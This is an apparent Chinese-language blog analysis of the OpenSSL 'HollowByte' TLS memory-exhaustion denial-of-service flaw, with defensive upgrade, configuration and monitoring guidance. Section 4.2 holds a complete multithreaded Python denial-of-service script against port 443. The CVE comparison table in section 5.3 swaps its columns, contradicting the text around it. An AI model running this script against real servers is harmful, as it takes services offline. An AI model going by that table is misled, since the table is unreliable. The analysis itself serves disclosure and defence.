---
title: "OpenSSL HollowByte 深度分析：11 字节 TLS 请求如何冻结服务器内存"
date: 2026-07-28
tags:
  - security
  - openssl
  - tls
  - dos
  - vulnerability-research
  - memory
keywords:
  - HollowByte
  - OpenSSL
  - TLS DoS
  - 内存耗尽
  - glibc 内存碎片
  - ClientHello
  - 11 bytes
  - memory exhaustion
  - Okta Red Team
  - 2026
category: 安全渗透
description: "2026 年 7 月 17 日，Okta 红队披露 OpenSSL HollowByte 漏洞：攻击者仅用 11 字节 TLS 请求就能让服务器分配 131KB 内存，glibc 内存碎片化导致 RSS 持续攀升，1GB 服务器被 OOM Kill。OpenSSL 在 6 月静默修复但未分配 CVE。本文从 TLS 握手缓冲区原理、glibc 分配器碎片化机制、攻击链复现到修复方案完整解析。"
recommend: 安全工程
---
# OpenSSL HollowByte 深度分析：11 字节 TLS 请求如何冻结服务器内存

## 引言：基础设施的沉默修复

2026 年 7 月 17 日，Okta 红队（Red Team）公开披露了一个 OpenSSL 拒绝服务漏洞，命名为 **HollowByte**。攻击者只需发送 **11 字节** 的 TLS 请求数据，就能让未打补丁的服务器为一个永远不会到来的握手消息分配高达 **131 KB** 的内存。

更令人不安的是，OpenSSL 团队在 **6 月 9 日** 就发布了修复版本（4.0.1、3.6.3、3.5.7、3.4.6、3.0.21），但 **没有分配 CVE 编号、没有发布安全公告、没有在 changelog 中标注**。直到 Okta 一个月后才公开详情。

这意味着：所有只跟踪 CVE 和安全公告来决定补丁优先级的运维团队，完全不知道这个修复的存在。

## 一、漏洞概述

| 属性 | 详情 |
|------|------|
| 名称 | HollowByte（Okta 红队命名） |
| CVE | **未分配**（OpenSSL 分类为"bug 或 hardening"） |
| 漏洞类型 | 拒绝服务（DoS）—— 内存耗尽 |
| 影响组件 | OpenSSL TLS 握手路径（ClientHello 处理） |
| 攻击前置条件 | **无** —— 无需认证、无需会话、无需密钥交换 |
| 单次请求开销 | 11 字节 → 131 KB 内存分配 |
| 测试效果（1GB 服务器） | OOM Kill（547 MB 内存被冻结碎片化） |
| 测试效果（16GB 服务器） | 25% 系统内存被锁定 |
| 修复版本 | OpenSSL 4.0.1, 3.6.3, 3.5.7, 3.4.6, 3.0.21 |
| 修复日期 | 2026-06-09 |
| 披露日期 | 2026-07-17（Okta 红队） |
| 影响范围 | Apache、NGINX、Node.js、Python、Ruby、PHP、MySQL、PostgreSQL 等所有依赖 OpenSSL 的软件 |

## 二、TLS 握手与缓冲区分配原理

### 2.1 TLS 握手消息结构

理解 HollowByte，需要先理解 TLS 握手的消息格式。TLS 连接以 **ClientHello** 消息开始，每个 TLS 握手消息携带一个 **4 字节头部**：

```
TLS 握手消息结构：
┌──────────────────────────────────────────────────────────┐
│  Byte 0    │  Byte 1-3                          │
│  Handshake │  Length (3 bytes, big-endian)      │
│  Type      │  声明的消息体长度                    │
│  (1 byte)  │  最大值: 2^24 - 1 = 16,777,215 bytes│
└────────────┴─────────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────┐
│                    消息体（Body）                          │
│  ClientHello: 版本号 + 随机数 + Session ID + 密码套件... │
│  最大声明长度: 131 KB (ClientHello 的实际上限)             │
└──────────────────────────────────────────────────────────┘
```

3 字节长度字段可以声明最大 **16 MB** 的消息体，但 TLS 协议对 ClientHello 的实际限制约为 **131 KB**。

### 2.2 漏洞根因：信任未验证的声明

**漏洞的核心**：OpenSSL 在收到握手消息头部后，**立即根据攻击者声明的长度分配缓冲区**，而不是等数据实际到达后再分配。

```
正常流程（修复后）：
  收到头部 → 等待数据到达 → 按实际到达数据增量分配 → 处理

漏洞流程（修复前）：
  收到头部 → 立即按声明长度 malloc → 等待数据（永远不会来）→ 内存被冻结
```

具体调用链：

```
读取 4 字节头部
    │
    ▼
grow_init_buf()          ← 根据头部声明的长度增长缓冲区
    │
    ▼
OPENSSL_clear_realloc()  ← 重新分配内存
    │
    ▼
malloc(attacker_size)    ← 分配攻击者声明大小的内存（最高 131KB）
    │
    ▼
Worker 线程阻塞           ← 等待永远不会到来的消息体数据
```

**关键**：在 TLS 握手的这个早期阶段，**没有任何负载验证**。攻击者声明的长度直接被 `malloc()` 采纳。

## 三、glibc 内存碎片化：为什么内存不回来

### 3.1 不只是连接耗尽

单纯保持连接打开来耗尽线程是经典攻击（如 Slowloris）。HollowByte 引入了更危险的复合效应，根源在于 **GNU C Library（glibc）** 的内存管理机制。

```
攻击者发送 11 字节请求
    │
    ▼
OpenSSL 分配 131KB 缓冲区（按攻击者声明）
    │
    ▼
Worker 线程阻塞等待数据（永远不会来）
    │
    ▼
攻击者断开连接
    │
    ▼
OpenSSL free() 释放缓冲区  ← 内存"释放"了
    │
    ▼
glibc 保留内存块（不还给操作系统）  ← 但内存没有真正释放！
    │
    ▼
攻击者用不同声明大小重复发送  ← 防止 glibc 复用已释放的块
    │
    ▼
堆碎片化严重 → RSS 持续攀升  ← 内存永久膨胀
```

### 3.2 glibc ptmalloc2 的 Arena 机制

glibc 的 ptmalloc2 分配器对于小到中等大小的内存块（< 128KB），不会立即将释放的内存归还操作系统，而是保留在 arena 的 free list 中以备复用。

```
glibc 内存归还策略：

┌──────────────────────────────────────────────────┐
│  内存块大小        │  free() 后行为               │
├───────────────────┼──────────────────────────────┤
│  < 128 KB         │  保留在 arena free list       │
│  (fastbin/tcache) │  不归还操作系统（延迟归还）    │
├───────────────────┼──────────────────────────────┤
│  128 KB - 1 MB    │  使用 mmap()，free 时 munmap  │
│                   │  可能归还操作系统               │
├───────────────────┼──────────────────────────────┤
│  > 1 MB           │  直接 mmap()，free 时 munmap  │
│                   │  立即归还                     │
└───────────────────┴──────────────────────────────┘
```

HollowByte 的攻击者通过 **随机化每次连接声明的消息大小**，阻止 glibc 复用已释放的内存块。不同大小的分配请求落入不同的 free bin，导致碎片化，使得 **即使连接断开，内存也无法被有效复用**。

### 3.3 为什么标准防护无效

Okta 红队的关键发现：**标准连接限制防御无法阻止 HollowByte**。

在 16GB 服务器的测试中，攻击者在 **不触及连接数上限** 的情况下，成功锁定了 25% 的系统内存。这是因为：

1. 连接数限制（如 `max_connections`）控制的是并发连接数
2. HollowByte 的内存分配在连接建立后立即发生
3. 即使断开连接，glibc 也不归还内存
4. 攻击者可以用 **少量并发连接** 反复发送不同大小的请求

## 四、攻击链完整复现

### 4.1 攻击架构图

```
┌──────────────────────────────────────────────────────────┐
│                      攻击者                                │
│                                                            │
│  ┌──────────────────────────────────┐                    │
│  │ 攻击脚本                           │                    │
│  │ for i in range(N):                │                    │
│  │   size = random(64, 131072)      │  随机化声明大小     │
│  │   payload = craft_header(size)   │  4字节头部+7字节     │
│  │   connect(target, payload)       │  共11字节请求       │
│  │   sleep(0.01)                    │  短暂连接            │
│  │   disconnect()                   │  立即断开            │
│  └──────────────────────────────────┘                    │
└──────────────────────┬───────────────────────────────────┘
                       │ 11 字节 TLS ClientHello 请求
┌──────────────────────▼───────────────────────────────────┐
│                   目标服务器 (NGINX + OpenSSL)              │
│                                                            │
│  ┌──────────────────────────────────────────────────┐    │
│  │  Worker 进程 1                                     │    │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐            │    │
│  │  │ 131KB   │ │ 64KB    │ │ 98KB    │ ← 碎片化    │    │
│  │  │ (free)  │ │ (free)  │ │ (free)  │   不归还     │    │
│  │  └─────────┘ └─────────┘ └─────────┘            │    │
│  └──────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────┐    │
│  │  Worker 进程 2                                     │    │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐            │    │
│  │  │ 45KB    │ │ 120KB   │ │ 77KB    │ ← 碎片化    │    │
│  │  │ (free)  │ │ (free)  │ │ (free)  │   不归还     │    │
│  │  └─────────┘ └─────────┘ └─────────┘            │    │
│  └──────────────────────────────────────────────────┘    │
│                                                            │
│  RSS 持续攀升 → 最终 OOM Kill                              │
└──────────────────────────────────────────────────────────┘
```

### 4.2 PoC 概念代码

以下是 HollowByte 攻击的概念验证代码（仅用于研究目的）：

```python
#!/usr/bin/env python3
"""
HollowByte PoC - 概念验证（仅用于授权安全测试）
通过发送 11 字节 TLS ClientHello 头部声明大消息体但不发送数据
"""

import socket
import struct
import random
import threading
import time

def craft_hollow_tls_request(declared_size: int) -> bytes:
    """
    构造一个 HollowByte TLS 请求（共 11 字节）

    TLS Record Header (5 bytes):
      - Content Type: 0x16 (Handshake)
      - Version: 0x0301 (TLS 1.0)
      - Length: 6 (剩余字节数)

    TLS Handshake Header (4 bytes):
      - Type: 0x01 (ClientHello)
      - Length: declared_size (3 bytes, big-endian) ← 攻击核心

    ClientHello body (2 bytes):
      - Client Version: 0x0303 (TLS 1.2)
      ← 仅发送 2 字节就断开，声明的 declared_size 字节永远不会到达
    """
    # TLS Record Layer (5 bytes)
    record = struct.pack(
        ">BHH",
        0x16,       # Content Type: Handshake
        0x0301,     # Version: TLS 1.0
        6,          # Length: 6 bytes follow
    )

    # TLS Handshake Header (4 bytes)
    handshake = struct.pack(
        ">B",
        0x01,       # Type: ClientHello
    )
    # 3-byte length (big-endian)
    handshake += struct.pack(
        ">I",
        declared_size,
    )[1:]  # 取后 3 字节

    # ClientHello body - 只发 2 字节版本号就断开
    client_hello_body = struct.pack(">H", 0x0303)  # TLS 1.2

    return record + handshake + client_hello_body  # 5 + 4 + 2 = 11 bytes


def attack_worker(target: str, port: int, duration: int):
    """单个攻击线程"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # 随机化声明大小（关键：防止 glibc 复用内存块）
            declared_size = random.randint(1024, 131072)  # 1KB - 128KB

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))

            # 发送 11 字节请求
            payload = craft_hollow_tls_request(declared_size)
            sock.send(payload)

            # 短暂等待让服务端分配缓冲区
            time.sleep(0.05)

            # 断开连接（OpenSSL free 缓冲区，但 glibc 不归还）
            sock.close()

        except Exception:
            continue


def main():
    TARGET = "127.0.0.1"
    PORT = 443
    THREADS = 50
    DURATION = 60  # 秒

    print(f"[HollowByte PoC] 目标: {TARGET}:{PORT}")
    print(f"[HollowByte PoC] 线程数: {THREADS}, 持续: {DURATION}s")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(
            target=attack_worker,
            args=(TARGET, PORT, DURATION),
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[HollowByte PoC] 完成")


if __name__ == "__main__":
    main()
```

## 五、OpenSSL 的修复方案

### 5.1 增量缓冲区分配

修复的核心变化：**不再信任头部声明的长度，而是增量分配缓冲区**。

```c
// 修复前：一次性分配
// OpenSSL 旧版本
buf = OPENSSL_clear_realloc(buf, 1, declared_length);
// ↑ 直接按攻击者声明的大小分配

// 修复后：增量分配
// OpenSSL 4.0.1, 3.6.3, 3.5.7, 3.4.6, 3.0.21
/* We incrementally allocate the buffer to guard against
 * the peer claiming a very large message size and then not
 * sending it. */
buf = OPENSSL_clear_realloc(buf, 1, MIN(declared_length, TLS_RECORD_MAX_SIZE));
// ↑ 每次最多分配一个 TLS record 的大小（16KB），数据实际到达后再增长
```

修复后，攻击者声明大消息体但不发送数据时，服务端最多分配 **16 KB**（一个 TLS record 的最大值），而非 131 KB。

### 5.2 修复效果

在 OpenSSL 的 NGINX 测试中，每个连接声明 65KB 消息体（测试框架产生的最大值）：

| 指标 | 修复前 | 修复后 | 改善 |
|------|--------|--------|------|
| Worker 峰值常驻内存 | ~102 MB | ~53 MB | -48% |
| 单连接内存分配 | 最高 131 KB | 最高 16 KB | -88% |
| 内存碎片化风险 | 高（不同大小分配） | 低（统一 16KB 增量） | 显著降低 |

### 5.3 为什么没有 CVE

OpenSSL 团队的解释：HollowByte 的内存分配是 **有界的（bounded）** 而非无界的（unbounded）。

| 维度 | HollowByte | CVE-2026-34183（同版本修复） |
|------|-----------|------------------------------|
| 漏洞 | QUIC PATH_CHALLENGE 泛洪 | TLS ClientHello 声明大小 |
| 内存增长 | 无限增长，无法通过配置阻止 | 有界，可通过连接限制控制 |
| 修复必须性 | 必须在库中修复 | 可通过应用配置缓解 |
| CVE 分配 | ✅ Moderate | ❌ 未分配 |

OpenSSL 认为：既然 HollowByte 的内存分配是有界的，且标准部署控制（连接限制、进程重启）可以缓解，它就不够格作为 CVE。但 Okta 红队和社区认为，glibc 的内存碎片化使得连接限制无效。

## 六、防御与缓解指南

### 6.1 升级 OpenSSL

**最重要的步骤**：升级到修复版本。

```bash
# 检查当前 OpenSSL 版本
openssl version

# 预期修复版本：
# OpenSSL 4.0.1+
# OpenSSL 3.6.3+
# OpenSSL 3.5.7+
# OpenSSL 3.4.6+
# OpenSSL 3.0.21+

# Ubuntu/Debian
sudo apt update && sudo apt upgrade openssl

# CentOS/RHEL
sudo dnf update openssl

# 源码编译
wget https://www.openssl.org/source/openssl-4.0.1.tar.gz
tar xzf openssl-4.0.1.tar.gz
cd openssl-4.0.1
./config --prefix=/usr/local/ssl
make && make install
```

### 6.2 部署层缓解（升级前）

如果暂时无法升级 OpenSSL，以下措施可降低风险：

```nginx
# NGINX 缓解配置
http {
    # 限制连接数
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        listen 443 ssl;
        
        # 限制单 IP 并发连接数
        limit_conn addr 10;
        
        # 限制 SSL 握手超时（缩短等待窗口）
        ssl_handshake_timeout 5s;
        
        # 限制请求体大小
        client_body_timeout 5s;
        client_header_timeout 5s;
    }
}
```

```bash
# 使用 systemd 设置服务内存限制
# /etc/systemd/system/nginx.service.d/override.conf
[Service]
MemoryMax=2G
MemoryHigh=1.5G
# 超过 MemoryHigh 时 systemd 会触发 OOM 或重启
```

### 6.3 监控指标

```bash
#!/bin/bash
# hollowbyte-monitor.sh — 监控可能的 HollowByte 攻击

# 监控 NGINX worker RSS
echo "=== NGINX Worker RSS 监控 ==="
ps aux | grep nginx | grep worker | awk '{print $2, $6/1024 " MB"}'

# 检查 TLS 半连接数
echo "=== TLS 半连接数 ==="
ss -tn state established '( dport = :443 )' | wc -l

# 检查系统内存碎片化程度
echo "=== /proc/meminfo 关键指标 ==="
grep -E "MemFree|MemAvailable|Slab|SReclaimable" /proc/meminfo

# 如果 RSS 持续攀升但连接数不高，可能是 HollowByte 攻击
```

### 6.4 使用 jemalloc 替代 glibc 分配器

由于 HollowByte 的关键放大因素是 glibc 的内存碎片化行为，使用替代分配器可以缓解：

```bash
# 安装 jemalloc
sudo apt install libjemalloc2

# 让 NGINX 使用 jemalloc
echo "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2" | sudo tee /etc/ld.so.preload

# 或通过环境变量
export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2
```

jemalloc 的 arena 管理策略在碎片化场景下优于 glibc ptmalloc2，能更积极地归还释放的内存给操作系统。

## 七、生态影响与深层启示

### 7.1 影响范围

OpenSSL 被广泛嵌入到几乎所有互联网基础设施中：

| 类别 | 受影响软件 |
|------|-----------|
| Web 服务器 | Apache HTTPD, NGINX, Caddy |
| 语言运行时 | Node.js, Python, Ruby, PHP |
| 数据库 | MySQL, PostgreSQL |
| 代理/负载均衡 | HAProxy, Envoy, Varnish |
| API 网关 | Kong, Tyk |

### 7.2 静默修复的治理问题

HollowByte 最值得关注的不是漏洞本身，而是 **OpenSSL 的披露策略**。

- **没有 CVE**：漏洞扫描器无标识可匹配
- **没有安全公告**：跟踪公告的运维团队无法发现
- **没有 changelog 标注**：23 条 changelog 条目中没有任何一条提及
- **PR 中的分类**：明确标注"handle this as a 'bug or hardening' only fix"

这意味着：**任何只合并安全相关补丁的下游分发者，可能完全错过了这个修复**。

### 7.3 对比：CVE-2025-66199

OpenSSL 在 2026 年 1 月为 CVE-2025-66199（TLS 1.3 证书压缩漏洞，Low 级别）分配了 CVE。那个漏洞需要四个条件同时满足，而 HollowByte **不需要任何条件**。HollowByte 比 CVE-2025-66199 更容易触发，却没有获得 CVE。

这引发了一个重要的社区讨论：**漏洞分级标准是否需要考虑攻击者侧的放大因素（如 glibc 行为），而不仅仅是漏洞本身的代码逻辑**。

## 八、总结

HollowByte 揭示了三个层面的问题：

1. **技术层面**：TLS 握手的缓冲区分配过于信任未验证的声明长度，修复方案（增量分配）简单有效
2. **运营层面**：glibc 内存碎片化使得标准连接限制防御失效，需要考虑分配器层面的替代方案
3. **治理层面**：OpenSSL 的静默修复策略造成了跟踪盲区，需要更透明的漏洞披露流程

对于运维团队：**立即升级 OpenSSL 到修复版本**，即使你的扫描器没有报告任何漏洞。

对于安全团队：在漏洞评估中，不仅要看代码逻辑，还要考虑运行时环境（如 glibc）的放大效应。

对于 OpenSSL 项目：社区需要更清晰的漏洞分级标准，以及"修复在公开但无标识"情况下的跟踪机制。

## 参考资料

- [OpenSSL 官方回应 - HollowByte](https://openssl-library.org/post/2026-07-21-hollowbyte)
- [Okta Red Team 披露文章](https://sec.okta.com/articles/2026/06/openssl-hollowbtye-a-dos-hiding-in-11-bytes/)
- [The CyberSignal 报道](https://www.thecybersignal.com/okta-hollowbyte-openssl-memory-freeze-2026)
- [oss-sec 邮件列表讨论](https://seclists.org/oss-sec/2026/q3/171)
- [OpenSSL PR #30792 - 修复补丁](https://github.com/openssl/openssl/pull/30792)
- [OpenSSL PR #30793 - 回溯补丁](https://github.com/openssl/openssl/pull/30793)
- [OpenSSL PR #30794 - 回溯补丁](https://github.com/openssl/openssl/pull/30794)
- [FireCompass 周报 - 7 月 CVE](https://firecompass.com/blog-weekly-cve-hacking-techniques-13-19-jul-2026)
- [glibc malloc 机制文档](https://www.gnu.org/software/libc/manual/html_node/Memory-Allocation.html)
- [Slowloris 慢速攻击 - 对比参考](https://en.wikipedia.org/wiki/Slowloris_(cyberattack))
- [CVE-2026-34183 - QUIC PATH_CHALLENGE](https://www.openssl.org/news/vulnerabilities.html)
